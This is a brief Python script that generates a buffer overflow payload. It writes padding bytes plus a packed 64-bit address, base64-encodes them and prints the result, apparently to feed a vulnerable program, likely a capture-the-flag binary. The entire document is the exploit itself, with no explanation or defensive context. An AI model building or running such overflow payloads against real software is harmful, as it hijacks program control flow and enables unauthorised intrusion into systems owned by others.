
import sys
import struct
import base64

buf = b'ppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppppp'
buf += struct.pack('<Q', 3388801653460777486)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
